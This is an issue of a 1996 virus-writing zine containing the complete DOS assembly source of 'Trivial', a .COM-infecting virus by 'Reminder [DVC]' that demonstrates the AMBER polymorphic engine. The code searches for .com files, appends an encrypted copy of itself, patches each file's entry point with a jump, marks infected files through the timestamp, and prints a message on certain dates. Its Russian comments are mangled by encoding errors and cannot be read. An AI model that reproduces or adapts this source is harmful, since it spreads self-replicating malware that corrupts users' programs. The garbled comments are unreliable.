   ; [Death Virii Crew] Presents
   ; CHAOS A.D. Vmag, Issue 2, Summer 1996                           file 008
   ;
   ;
   ;                         *à¨¬¥à ¨á¯®«ì§®¢ ¨ï AMBER.
   ;
   ;                                 Trivial
   ;
   ;   *â®â .COM-¥à¥§¨¤¥â ¡ë«  ¯¨á  ¨áª«îç¨â¥«ì® ¤«ï ¤¥¬®áâà æ¨¨ AMBER.
   ;   Trivial - íâ® ¨ ¥áâì Trivial. —â® ï ¥é¥ ¬®£ã ª íâ®¬ã ¤®¡ ¢¨âì ;)))))

   ;================================ à¥§ âì âãâ ============================
   .286
   .model tiny
   .code
   org 100h
   start:
   call $+3
   pop bp
   sub bp,3

   mov cx,100                              ; ¤«¨  DTA
   mov si,80h                              ; * ç¨ ï á 80h
   mov di,buf1
   cld
   rep movsb                               ; ‘®åà ï¥¬ DTA

   mov si,old3bytes-start
   add si,bp
   mov di,rest
   mov cx,3
   cld
   rep movsb

   mov ah,4eh                              ; äãªæ¨ï ¯®¨áª  ¯¥à¢®£® ä ©« 

   find:

   mov cx,20h              ; á  âà¨¡ãâ®¬ ARCHIVE
   mov dx,fmask-start      ; ¨ ¯® ¬ áª¥ â®«ìª® .COM ä ©«ë
   add dx,bp
   int 21h                 ; á®¡áâ¢¥® á ¬® ¯à¥àë¢ ¨¥
   jnc @qw
   jmp quit

   @qw:
   cmp word ptr ds:[9ah],len      ; ¯® á¬¥é¥¨î 9ah - ¤«¨   ©¤¥®© ¯à®£¨
   jb next1                       ; ¥á«¨ ¤«¨  íâ  ¬¥ìè¥ ¤«¨ë ¢¨àãá  â® next
   cmp word ptr ds:[9ah],61000    ;   ¥á«¨ ®  ¢¤àã£ ¡®«ìè¥ 61000
   ja next1                                 ; â®   «®£¨çë© à¥§ã«ìâ â
   mov al,byte ptr ds:[96h]
   and al,1fh
   cmp al,7
   jz next1

   ;---------------------------------- save time & data -------------------
   mov si,__time-start
   add si,bp
   mov ax,ds:[96h]
   mov [si],ax
   mov ax,ds:[98h]
   mov [si+2],ax
   ;------------------------------------------------------------------------

   mov ax,3d02h
   mov dx,9eh
   int 21h
   jc next

   xchg ax,bx
   mov ah,3fh
   mov cx,3
   mov dx,old3bytes-start
   add dx,bp
   int 21h
   jc next

   mov si,dx
   cmp word ptr [ds:si],'MZ'       ; € ¥ ï¢«ï¥âáï «¨
   jz next                         ; íâ  ¯à®£  á«ãç ©®
   cmp word ptr [ds:si],'ZM'       ; EXEè¨ª®¬ (¢  ç «¥ ZM ¨«¨ MZ)
   jnz @a1                          ; ¯¥à¥¨¬¥®¢ ë¬ ¢ COM ?

   next:                           ; ¬ë ¢áâà¥â¨«¨ ¡à â  ?
   mov ah,3eh                      ; äãªæ¨ï § ªàëâ¨ï ä ©« 
   int 21h                         ; ¯à¥àë¢ ¨¥
   next1:
   mov ah,4fh                      ; äãªæ¨ï ¯®¨áª  á«¥¤ãîé¥£®
   jmp find                        ; ¨   ¯®¨áª âì ¨¤¥¬ ®¯ïâì ¢  ç «®

   @a1:
   mov ax,4202h                    ; äãªæ¨ï ¯¥à¥¬¥é¥¨ï pointer'a
   xor cx,cx                       ; á¬¥é¥¨¥ ®âáâã¯ 
   xor dx,dx                       ; ®â ª®æ  = 0
   int 21h                         ; ¯à¥àë¢¨¥
   jc next                         ; ®è¨¡ª¨ ? ®¯ïâì   ¯®¨áª âì

   push bx

   mov bx,base

   mov ax,ds
   mov [bx.segsource],ax
   mov [bx.ofssource],bp
   mov [bx.lensource],len

   mov [bx.segcrypt],ax
   mov [bx.ofscrypt],buf
   mov ax,ds:[9ah]

   mov cx,ax
   sub cx,3
   mov [bp+form-start+1],cx

   add ax,100h
   mov [bx.startIP],ax
   pusha
   call phantom
   popa

   mov cx,[bx.lencrypt]
   mov dx,buf
   pop bx

   mov ah,40h
   int 21h
   jc next

   mov ax,4200h  ; äãªæ¨ï ¯¥à¥¬¥é¥¨ï pointer'a, â¥¯¥àì ã¦¥ ¢  ç «® ¯à®£¨
   xor cx,cx     ; á¬¥é¥¨ï ®â  ç « 
   xor dx,dx     ; à ¢ë 0
   int 21h       ; ¯¥à¥¬¥é ¥¬
   jc next       ; ®è¨¡ª¨ ? ¬ë ¨¤¥¬ ¨áª âì á«¥¤ãîé¨©

   mov ah,40h    ; äãªæ¨ï § ¯¨á¨ ¢ ä ©«
   mov dx,form-start
   add dx,bp
   mov cx,3
   int 21h       ; ¨ § ¯¨áë¢ ¥¬ ¢¨àãá ¢  ç «® ¯à®£¨
   jc next       ; ®è¨¡ª¨ ? ã ¢ë § ¥â¥

   mov si,__time-start
   add si,bp
   mov cx,[si]
   and cl,0e0h
   add cl,7
   mov dx,[si+2]
   mov ax,5701h
   int 21h

   jmp next

   quit:       ; ¢ëå®¤ §¤¥áì !

   mov di,80h
   mov si,buf1
   mov cx,100
   rep movsb  ; ‚®ááâ  ¢«¨¢ ¥¬ DTA

   mov si,rest
   mov di,100h
   cld
   movsb
   movsw


   mov ah,2ah
   int 21h

   cmp dh,dl
   jnz idi

   mov dx,mess-start
   add dx,bp
   mov ah,9
   int 21h

   idi:
   xor ax,ax
   xor bx,bx
   mov cx,0ffh
   mov bp,sp
   mov si,100h
   jmp si

   fmask db '*.com',0 ; ¬ áª  ä ©«®¢, ª®â®àë¥ ¬ë ¡ã¤¥¬ ¨áª âì
   mess db '[Trivial]',e
   old3bytes db 0cdh,20h,0
   form db 0e9h,0,0
   __time dd 0
   e equ 0dh,0ah
   buf equ 0f000h               ; ¡ãä¥à á ª®â®àë¬ ¬ë à ¡®â ¥¬ - ¢ëá®ª® ¢ëá®ª®
   buf1 equ buf-150
   base equ buf1-50
   rest equ base-4
   include amber.asm
   len equ $-start              ; ¤«¨  ¢¨àãá 
   end start                    ; íâ® ä¨ «

   ;================================ à¥§ âì âãâ ============================



   ;                                        (c) by Reminder [DVC]
